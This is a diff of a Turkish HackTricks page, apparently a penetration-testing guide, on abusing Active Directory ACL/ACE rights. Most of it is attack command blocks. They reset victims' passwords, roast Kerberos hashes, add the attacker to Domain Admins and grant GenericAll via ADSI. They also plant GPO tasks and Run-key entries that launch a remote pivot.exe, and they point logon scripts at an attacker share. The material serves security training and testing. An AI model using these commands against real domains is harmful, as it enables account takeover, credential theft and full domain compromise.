@@ -1,8 +1,8 @@
-# Active Directory ACL/ACE'lerini Kötüye Kullanma
+# Active Directory ACL'lerini/ACE'lerini Kötüye Kullanma
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Bu sayfa çoğunlukla** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **adreslerindeki tekniklerin bir özetidir. Daha fazla ayrıntı için orijinal makalelere göz atın.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
+**Bu sayfa çoğunlukla** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **içindeki tekniklerin özetidir. Daha fazla bilgi için orijinal makalelere göz atın.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
 
 ## BadSuccessor
 
@@ -13,45 +13,56 @@ BadSuccessor.md
 
 ## **Kullanıcı Üzerinde GenericAll Hakları**
 
-Bu ayrıcalık, saldırgana hedef kullanıcı hesabı üzerinde tam denetim sağlar. `GenericAll` hakları `Get-ObjectAcl` komutu kullanılarak doğrulandıktan sonra saldırgan şunları yapabilir:
+Bu ayrıcalık, saldırgana hedef kullanıcı hesabı üzerinde tam denetim sağlar. `Get-ObjectAcl` komutuyla `GenericAll` hakları doğrulandıktan sonra saldırgan şunları yapabilir:
 
-- **Hedefin Parolasını Değiştirme**: `net user <username> <password> /domain` kullanılarak saldırgan kullanıcının parolasını sıfırlayabilir.
-- Linux'tan aynı işlemi Samba `net rpc` ile SAMR üzerinden gerçekleştirebilirsiniz:<sup>[[9]](#references)[[10]](#references)</sup>
+- **Hedefin Parolasını Değiştirme**: Saldırgan, `net user <username> <password> /domain` komutunu kullanarak kullanıcının parolasını sıfırlayabilir.
+- Linux'tan aynı işlemi Samba `net rpc` ile SAMR üzerinden yapabilirsiniz:<sup>[[9]](#references)[[10]](#references)</sup>
+
 ```bash
 # Reset target user's password over SAMR from Linux
 net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
 ```
-- **Hesap devre dışıysa UAC flag'ini kaldırın**: `GenericAll`, `userAccountControl` değerinin düzenlenmesine izin verir. Linux üzerinden BloodyAD, `ACCOUNTDISABLE` flag'ini kaldırabilir:<sup>[[8]](#references)[[10]](#references)</sup>
+
+- **Hesap devre dışıysa UAC bayrağını kaldırın**: `GenericAll`, `userAccountControl` düzenlemeye izin verir. Linux'tan BloodyAD, `ACCOUNTDISABLE` bayrağını kaldırabilir:<sup>[[8]](#references)[[10]](#references)</sup>
+
 ```bash
 bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
 ```
-- **Targeted Kerberoasting**: Kullanıcının hesabına bir SPN atayarak onu kerberoastable hale getirin, ardından ticket-granting ticket (TGT) hash'lerini çıkarmak ve kırmayı denemek için Rubeus ve targetedKerberoast.py kullanın.
+
+- **Targeted Kerberoasting**: Hesabı kerberoastable hale getirmek için kullanıcının hesabına bir SPN atayın, ardından ticket-granting ticket (TGT) hash'lerini çıkarmak ve kırmayı denemek için Rubeus ve targetedKerberoast.py kullanın.
+
 ```bash
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-- **Targeted ASREPRoasting**: Kullanıcı için ön kimlik doğrulamayı devre dışı bırakarak hesabını ASREPRoasting'e karşı savunmasız hâle getirin.
+
+- **Targeted ASREPRoasting**: Kullanıcı için pre-authentication'ı devre dışı bırakarak hesabını ASREPRoasting'e karşı savunmasız hâle getirin.
+
 ```bash
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
-- **Shadow Credentials / Key Credential Link**: Bir kullanıcı üzerinde `GenericAll` yetkisine sahipseniz, sertifika tabanlı bir kimlik bilgisi ekleyebilir ve kullanıcının parolasını değiştirmeden onun kimliğiyle authenticate olabilirsiniz. Bkz.:
+
+- **Shadow Credentials / Key Credential Link**: Bir kullanıcı üzerinde `GenericAll` yetkiniz varsa, parolasını değiştirmeden sertifika tabanlı bir kimlik bilgisi ekleyebilir ve o kullanıcı olarak kimlik doğrulaması yapabilirsiniz. Bkz.:
 
 {{#ref}}
 shadow-credentials.md
 {{#endref}}
 
-## **Grup Üzerinde GenericAll Yetkileri**
+## **Grup Üzerinde GenericAll Hakları**
 
-Bu yetki, saldırganın `Domain Admins` gibi bir grup üzerinde `GenericAll` yetkisine sahip olması durumunda grup üyeliklerini değiştirmesine olanak tanır. Saldırgan, grubun distinguished name bilgisini `Get-NetGroup` ile belirledikten sonra şunları yapabilir:
+Bu ayrıcalık, saldırganın `Domain Admins` gibi bir grup üzerinde `GenericAll` hakları varsa grup üyeliklerini değiştirmesine olanak tanır. `Get-NetGroup` ile grubun distinguished name değerini belirledikten sonra saldırgan şunları yapabilir:
 
-- **Kendilerini Domain Admins Grubuna Ekleme**: Bu işlem doğrudan komutlarla veya Active Directory ya da PowerSploit gibi modüller kullanılarak gerçekleştirilebilir.
+- **Kendilerini Domain Admins Grubuna Ekleme**: Bu, doğrudan komutlar kullanılarak veya Active Directory ya da PowerSploit gibi modüller aracılığıyla yapılabilir.
+
 ```bash
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
-- Linux'tan, üzerlerinde GenericAll/Write üyelik yetkisine sahip olduğunuz rastgele gruplara kendinizi eklemek için BloodyAD'den de yararlanabilirsiniz. Hedef grup “Remote Management Users” grubunun içine nested edilmişse, bu gruba uyan host'larda hemen WinRM erişimi kazanırsınız:<sup>[[8]](#references)</sup>
+
+- Linux’tan, üzerinde GenericAll/Write üyelik yetkisine sahip olduğunuz rastgele gruplara kendinizi eklemek için BloodyAD’den de yararlanabilirsiniz. Hedef grup “Remote Management Users” grubunun içinde yer alıyorsa, bu grubu dikkate alan sunucularda hemen WinRM erişimi kazanırsınız:<sup>[[8]](#references)</sup>
+
 ```bash
 # Linux tooling example (BloodyAD) to add yourself to a target group
 bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>
@@ -59,37 +70,45 @@ bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Ta
 # If the target group is member of "Remote Management Users", WinRM becomes available
 netexec winrm <dc-fqdn> -u <user> -p '<pass>'
 ```
-## **GenericAll / GenericWrite / Write on Computer/User**
 
-Bu ayrıcalıklara bir computer object veya user account üzerinde sahip olmak şunları sağlar:
+## **Computer/User Üzerinde GenericAll / GenericWrite / Write**
+
+Bir computer object veya user account üzerinde bu ayrıcalıklara sahip olmak şunları sağlar:
 
 - **Kerberos Resource-based Constrained Delegation**: Bir computer object'in ele geçirilmesini sağlar.
-- **Shadow Credentials**: Shadow credentials oluşturma ayrıcalıklarından yararlanarak bir computer veya user account'ını taklit etmek için bu technique kullanılabilir.
+- **Shadow Credentials**: Shadow credentials oluşturma ayrıcalıklarından yararlanarak bir computer veya user account kimliğine bürünmek için bu tekniği kullanın.
 
-## **WriteProperty on Group**
+## **Group Üzerinde WriteProperty**
 
-Bir user belirli bir group'daki tüm objects üzerinde `WriteProperty` haklarına sahipse (ör. `Domain Admins`), şunları yapabilir:
+Bir kullanıcı belirli bir group'taki (ör. `Domain Admins`) tüm nesneler için `WriteProperty` haklarına sahipse şunları yapabilir:
 
-- **Add Themselves to the Domain Admins Group**: `net user` ve `Add-NetGroupUser` komutlarının birlikte kullanılmasıyla gerçekleştirilebilen bu yöntem, domain içinde privilege escalation sağlar.
+- **Kendini Domain Admins Group'a Ekleme**: `net user` ve `Add-NetGroupUser` komutları birlikte kullanılarak gerçekleştirilebilen bu yöntem, domain içinde ayrıcalık yükseltmeye olanak tanır.
+
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-## **Group üzerinde Self (Self-Membership)**
 
-Bu yetki, saldırganların grup üyeliğini doğrudan değiştiren komutlar aracılığıyla kendilerini `Domain Admins` gibi belirli gruplara eklemelerine olanak tanır. Aşağıdaki komut dizisi, kendini gruba eklemeyi sağlar:
+## **Grup üzerinde Self (Self-Membership)**
+
+Bu ayrıcalık, saldırganların grup üyeliğini doğrudan değiştiren komutlarla kendilerini `Domain Admins` gibi belirli gruplara eklemelerini sağlar. Aşağıdaki komut dizisi, kişinin kendisini gruba eklemesine olanak tanır:
+
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
+
 ## **WriteProperty (Self-Membership)**
 
-Benzer bir ayrıcalık olan bu hak, saldırganların gruplar üzerinde `WriteProperty` hakkına sahip olmaları durumunda grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır. Bu ayrıcalığın doğrulanması ve kullanılması şu şekilde gerçekleştirilir:
+Benzer bir ayrıcalık olan bu hak, saldırganların gruplar üzerinde `WriteProperty` yetkileri varsa grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır. Bu ayrıcalığın doğrulanması ve kullanılması şu şekilde gerçekleştirilir:
+
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
 ```
+
 ## **ForceChangePassword**
 
-Bir kullanıcı üzerinde `User-Force-Change-Password` için `ExtendedRight` yetkisine sahip olmak, mevcut parolayı bilmeden parola sıfırlamaya olanak tanır. Bu yetkinin doğrulanması ve istismar edilmesi PowerShell veya alternatif komut satırı araçları aracılığıyla gerçekleştirilebilir. Etkileşimli oturumlar ve etkileşimsiz ortamlar için one-liner'lar dahil olmak üzere, kullanıcının parolasını sıfırlamak için çeşitli yöntemler sunulur. Komutlar, basit PowerShell çağrılarından Linux üzerinde `rpcclient` kullanımına kadar uzanarak saldırı vektörlerinin çok yönlülüğünü gösterir.
+Bir kullanıcı üzerinde `User-Force-Change-Password` için `ExtendedRight` yetkisine sahip olmak, mevcut parolayı bilmeden parola sıfırlamaya olanak tanır. Bu yetkiyi doğrulamak ve kötüye kullanmak PowerShell veya alternatif komut satırı araçlarıyla mümkündür. Kullanıcının parolasını sıfırlamak için etkileşimli oturumlar ve etkileşimsiz ortamlar için tek satırlık komutlar da dahil olmak üzere çeşitli yöntemler kullanılabilir. Komutlar, basit PowerShell komutlarından Linux'ta `rpcclient` kullanımına kadar uzanarak saldırı vektörlerinin çeşitliliğini gösterir.
+
 ```bash
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -100,23 +119,31 @@ Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureStri
 rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
-## **Group Üzerinde WriteOwner**
 
-Bir attacker, bir group üzerinde `WriteOwner` haklarına sahip olduğunu tespit ederse group sahipliğini kendi üzerine değiştirebilir. Bu durum, söz konusu group `Domain Admins` olduğunda özellikle etkilidir; çünkü sahipliğin değiştirilmesi, group attributes ve membership üzerinde daha geniş kontrol sağlar. Süreç, `Get-ObjectAcl` kullanılarak doğru object'in belirlenmesini ve ardından owner'ın SID veya name kullanılarak değiştirilmesi için `Set-DomainObjectOwner` kullanılmasını içerir.
+## **Grup üzerinde WriteOwner**
+
+Bir saldırgan, bir grup üzerinde `WriteOwner` haklarına sahip olduğunu tespit ederse grubun sahipliğini kendisine geçirebilir. Söz konusu grup `Domain Admins` ise bu özellikle etkilidir; çünkü sahipliği değiştirmek, grup öznitelikleri ve üyeliği üzerinde daha geniş denetim sağlar. Süreç, `Get-ObjectAcl` ile doğru nesneyi belirlemeyi ve ardından sahibi SID veya ad kullanarak değiştirmek için `Set-DomainObjectOwner` kullanmayı içerir.
+
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
-## **Kullanıcı üzerinde GenericWrite**
 
-Bu izin, saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle `GenericWrite` erişimiyle saldırgan, kullanıcı oturum açtığında kötü amaçlı bir script çalıştırmak için kullanıcının logon script path değerini değiştirebilir. Bu işlem, hedef kullanıcının `scriptpath` özelliğini saldırganın script'ine işaret edecek şekilde güncellemek için `Set-ADObject` komutu kullanılarak gerçekleştirilir.
+## **Kullanıcı Üzerinde GenericWrite**
+
+Bu izin, saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle `GenericWrite` erişimiyle saldırgan, kullanıcı oturum açtığında kötü amaçlı bir betiğin çalıştırılması için kullanıcının oturum açma betiği yolunu değiştirebilir. Bunun için `Set-ADObject` komutu kullanılarak hedef kullanıcının `scriptpath` özelliği saldırganın betiğini gösterecek şekilde güncellenir.
+
 ```bash
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
-## **GenericWrite on Group**
 
-Bu ayrıcalıkla saldırganlar, kendilerini veya diğer kullanıcıları belirli gruplara eklemek gibi grup üyeliğini değiştirebilir. Bu işlem; bir credential object oluşturmayı, bunu kullanarak bir gruba kullanıcı eklemeyi veya gruptan kullanıcı çıkarmayı ve PowerShell komutlarıyla üyelik değişikliklerini doğrulamayı içerir.
+Daha dar kapsamlı ve kullanıcının [`scriptPath` attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) özniteliğiyle sınırlı bir `WriteProperty` ACE yeterli olabilir; `GenericWrite` gerekli değildir. Bu öznitelik yetkisini, etki alanının `SYSVOL\<domain>\scripts` veya `NETLOGON` ağacındaki yazılabilir bir script ile birlikte değerlendirin; ardından hedef kullanıcının oturum açma ve script’e erişme olasılığını inceleyin. Script, oturum açıldığında o kullanıcının bağlamında çalışır. Etkin AD ACL’lerini ve dosya/paylaşım ACL’lerini ayrı ayrı inceleyin; eşleşen bir Allow ACE veya tek başına yazılabilir bir dizin, gerekli erişim yolunun tamamını kanıtlamaz.
+
+## **Grupta GenericWrite**
+
+Bu ayrıcalıkla saldırganlar, kendilerini veya başka kullanıcıları belirli gruplara eklemek gibi işlemlerle grup üyeliğini değiştirebilir. Bu süreç; bir credential object oluşturmayı, bunu kullanarak kullanıcıları bir gruba eklemeyi veya gruptan çıkarmayı ve PowerShell komutlarıyla üyelik değişikliklerini doğrulamayı içerir.
+
 ```bash
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -124,16 +151,20 @@ Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'userna
 Get-DomainGroupMember -Identity "Group Name" | Select MemberName
 Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
 ```
-- Linux'tan, grup üzerinde `GenericWrite` yetkiniz olduğunda Samba `net` üyeleri ekleyebilir/kaldırabilir (PowerShell/RSAT kullanılamadığında kullanışlıdır):<sup>[[9]](#references)[[10]](#references)</sup>
+
+- Linux'tan Samba `net`, grup üzerinde `GenericWrite` yetkiniz varsa üye ekleyip kaldırabilir (PowerShell/RSAT kullanılamadığında kullanışlıdır):<sup>[[9]](#references)[[10]](#references)</sup>
+
 ```bash
 # Add yourself to the target group via SAMR
 net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
 # Verify current members
 net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
 ```
+
 ## **WriteDACL + WriteOwner**
 
-Bir AD object'inin sahibi olmak ve üzerinde `WriteDACL` privileges'ına sahip olmak, bir saldırganın object üzerinde kendisine `GenericAll` privileges vermesini sağlar. Bu işlem, ADSI manipulation aracılığıyla gerçekleştirilir; böylece object üzerinde tam kontrol elde edilir ve group memberships değiştirilir. Buna rağmen, Active Directory module'ünün `Set-Acl` / `Get-Acl` cmdlet'lerini kullanarak bu privileges'ları exploit etmeye çalışırken bazı sınırlamalar vardır.<sup>[[4]](#references)[[7]](#references)</sup>
+Bir AD nesnesine sahip olmak ve bu nesne üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, saldırganın nesne üzerinde kendisine `GenericAll` ayrıcalıkları vermesini sağlar. Bu işlem, ADSI manipülasyonu yoluyla gerçekleştirilir ve nesne üzerinde tam denetim sağlamanın yanı sıra grup üyeliklerini değiştirme olanağı sunar. Buna rağmen, Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlet’lerini kullanarak bu ayrıcalıklardan yararlanmaya çalışırken bazı kısıtlamalar vardır.<sup>[[4]](#references)[[7]](#references)</sup>
+
 ```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -141,9 +172,11 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
-### WriteDACL/WriteOwner hızlı ele geçirme (PowerView)
 
-Bir kullanıcı veya service account üzerinde `WriteOwner` ve `WriteDacl` izinlerine sahip olduğunuzda, eski parolayı bilmeden PowerView kullanarak tam kontrol elde edebilir ve parolasını sıfırlayabilirsiniz:
+### WriteDACL/WriteOwner ile hızlı ele geçirme (PowerView)
+
+Bir kullanıcı veya hizmet hesabı üzerinde `WriteOwner` ve `WriteDacl` izinlerine sahipseniz, eski parolayı bilmeden PowerView kullanarak hesabın tam kontrolünü ele geçirebilir ve parolasını sıfırlayabilirsiniz:
+
 ```powershell
 # Load PowerView
 . .\PowerView.ps1
@@ -155,81 +188,93 @@ Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdent
 $cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
 Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
 ```
+
 Notlar:
-- Yalnızca `WriteOwner` yetkiniz varsa, önce sahibi kendiniz olarak değiştirmeniz gerekebilir:
+- Yalnızca `WriteOwner` izniniz varsa önce sahipliği kendinize geçirmeniz gerekebilir:
+
 ```powershell
 Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
 ```
-- Parola sıfırlama sonrasında herhangi bir protokolle (SMB/LDAP/RDP/WinRM) erişimi doğrulayın.
 
-## **Domain Üzerinde Replication (DCSync)**
+- Parola sıfırlama işleminden sonra herhangi bir protokolle (SMB/LDAP/RDP/WinRM) erişimi doğrulayın.
 
-DCSync saldırısı, bir Domain Controller'ı taklit etmek ve kullanıcı kimlik bilgileri de dahil olmak üzere verileri senkronize etmek için domain üzerindeki belirli replication izinlerinden yararlanır. Bu güçlü teknik, saldırganların bir Domain Controller'a doğrudan erişmeden AD ortamından hassas bilgileri çıkarmasına olanak tanıyan `DS-Replication-Get-Changes` gibi izinleri gerektirir.<sup>[[5]](#references)</sup> [**DCSync attack hakkında daha fazla bilgi edinin.**](../dcsync.md)
+## **Etki Alanında Replikasyon (DCSync)**
 
-## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>
+DCSync saldırısı, Domain Controller'ı taklit edip kullanıcı kimlik bilgileri dahil verileri senkronize etmek için etki alanındaki belirli replikasyon izinlerinden yararlanır. Bu güçlü teknik, saldırganların Domain Controller'a doğrudan erişmeden AD ortamındaki hassas bilgileri çıkarmasına olanak tanıyan `DS-Replication-Get-Changes` gibi izinler gerektirir.<sup>[[5]](#references)</sup> [**DCSync saldırısı hakkında daha fazla bilgi edinin.**](../dcsync.md)
 
-### GPO Delegation
+## GPO Yetkilendirmesi <a href="#gpo-delegation" id="gpo-delegation"></a>
 
-Group Policy Objects (GPOs) yönetimi için devredilen erişim, önemli güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları devredilmişse **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilir. PowerView kullanılarak belirlenen bu izinler kötü amaçlarla kötüye kullanılabilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>
+### GPO Yetkilendirmesi
 
-### GPO Permissions Enumerate Etme
+Group Policy Objects (GPO'lar) yönetmek için devredilen erişim, önemli güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları devredildiyse, bu kullanıcı **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilir. Bu izinler kötü amaçlarla kötüye kullanılabilir. PowerView kullanılarak tespit edilebilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>
 
-Yanlış yapılandırılmış GPOs'ları belirlemek için PowerSploit'in cmdlet'leri birbirine zincirlenebilir. Bu, belirli bir kullanıcının yönetme izinlerine sahip olduğu GPOs'ların keşfedilmesini sağlar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+### GPO İzinlerini Numaralandırma
 
-**Belirli Bir Policy'nin Uygulandığı Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını çözümlemek mümkündür; bu, olası etkinin kapsamını anlamaya yardımcı olur. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+Yanlış yapılandırılmış GPO'ları belirlemek için PowerSploit cmdlet'leri zincirleme kullanılabilir. Böylece belirli bir kullanıcının yönetme iznine sahip olduğu GPO'lar bulunabilir: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Belirli Bir Bilgisayara Uygulanan Policy'ler**: Belirli bir bilgisayara hangi policy'lerin uygulandığını görmek için `Get-DomainGPO` gibi komutlardan yararlanılabilir.
+**Belirli Bir Politikanın Uygulandığı Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını belirleyerek olası etkinin kapsamını anlamak mümkündür. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
-**Belirli Bir Policy'nin Uygulandığı OU'lar**: Belirli bir policy'den etkilenen organizational unit'leri (OU'lar) belirlemek için `Get-DomainOU` kullanılabilir.
+**Belirli Bir Bilgisayara Uygulanan Politikalar**: Belirli bir bilgisayara hangi politikaların uygulandığını görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.
 
-GPOs'ları enumerate etmek ve içlerindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.
+**Belirli Bir Politikanın Uygulandığı OU'lar**: Belirli bir politikadan etkilenen organizasyon birimleri (OU'lar), `Get-DomainOU` kullanılarak belirlenebilir.
 
-### Abuse GPO - New-GPOImmediateTask
+GPO'ları numaralandırmak ve içlerindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.
 
-Yanlış yapılandırılmış GPOs'lar, örneğin immediate scheduled task oluşturarak code çalıştırmak için exploit edilebilir. Bu işlem, etkilenen makinelerde bir kullanıcıyı local administrators grubuna eklemek ve ayrıcalıkları önemli ölçüde yükseltmek için kullanılabilir:
+### GPO'yu Kötüye Kullanma - New-GPOImmediateTask
+
+Yanlış yapılandırılmış GPO'lar, örneğin anında çalışan bir zamanlanmış görev oluşturularak kod yürütmek için istismar edilebilir. Bu yöntem, etkilenen makinelerde bir kullanıcıyı yerel yöneticiler grubuna ekleyerek ayrıcalıkları önemli ölçüde yükseltmek için kullanılabilir:
+
 ```bash
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
+
 ### GroupPolicy module - Abuse GPO
 
-GroupPolicy module'ü yüklüyse yeni GPO'lar oluşturulup bağlanmasına ve etkilenen bilgisayarlarda backdoor çalıştırmak için registry değerleri gibi tercihlerin ayarlanmasına olanak tanır. Bu yöntem, GPO'nun güncellenmesini ve çalıştırma işlemi için bir kullanıcının bilgisayarda oturum açmasını gerektirir:
+GroupPolicy modülü, yüklüyse, yeni GPO'lar oluşturup bunları bağlamaya ve etkilenen bilgisayarlarda backdoor'ları çalıştırmak için kayıt defteri değerleri gibi tercihleri ayarlamaya olanak tanır. Bu yöntem, GPO'nun güncellenmesini ve çalıştırılabilmesi için bir kullanıcının bilgisayarda oturum açmasını gerektirir:
+
 ```bash
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
-### SharpGPOAbuse - Abuse GPO
 
-SharpGPOAbuse, yeni GPO'lar oluşturma gereksinimi olmadan görevler ekleyerek veya ayarları değiştirerek mevcut GPO'ları abuse etmek için bir yöntem sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:
+### SharpGPOAbuse - GPO'yu Kötüye Kullanma
+
+SharpGPOAbuse, yeni GPO'lar oluşturma gereği olmadan görevler ekleyerek veya ayarları değiştirerek mevcut GPO'ları kötüye kullanmanın bir yolunu sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:
+
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
-### Policy Update'ini Zorlama
 
-GPO güncellemeleri genellikle yaklaşık 90 dakikada bir gerçekleşir. Bu süreci, özellikle bir değişiklik uygulandıktan sonra hızlandırmak için hedef bilgisayarda `gpupdate /force` komutu kullanılabilir ve böylece anında policy update zorlanabilir. Bu komut, GPO'larda yapılan değişikliklerin bir sonraki otomatik güncelleme döngüsünün beklenmesine gerek kalmadan uygulanmasını sağlar.
+### İlke Güncellemesini Zorlama
 
-### Under the Hood
+GPO güncellemeleri genellikle yaklaşık her 90 dakikada bir gerçekleşir. Bu süreci, özellikle bir değişiklik uyguladıktan sonra hızlandırmak için hedef bilgisayarda `gpupdate /force` komutu kullanılarak ilke güncellemesi hemen zorlanabilir. Bu komut, GPO’larda yapılan değişikliklerin bir sonraki otomatik güncelleme döngüsü beklenmeden uygulanmasını sağlar.
 
-`Misconfigured Policy` gibi belirli bir GPO için Scheduled Tasks incelendiğinde, `evilTask` gibi görevlerin eklendiği doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya yetkileri yükseltmeyi amaçlayan script'ler ya da command-line araçları aracılığıyla oluşturulur.
+### İşleyişin Ayrıntıları
 
-`New-GPOImmediateTask` tarafından oluşturulan XML configuration file'da gösterilen görev yapısı, çalıştırılacak command ve tetikleyicileri dahil olmak üzere scheduled task'ın ayrıntılarını belirtir. Bu dosya, scheduled task'ların GPO'lar içinde nasıl tanımlandığını ve yönetildiğini gösterir ve policy enforcement'ın bir parçası olarak arbitrary command'lerin veya script'lerin çalıştırılması için bir yöntem sunar.
+`Misconfigured Policy` gibi belirli bir GPO’nun Zamanlanmış Görevleri incelendiğinde, `evilTask` gibi görevlerin eklendiği doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya ayrıcalıkları yükseltmeyi amaçlayan betikler ya da komut satırı araçları aracılığıyla oluşturulur.
 
-### Users and Groups
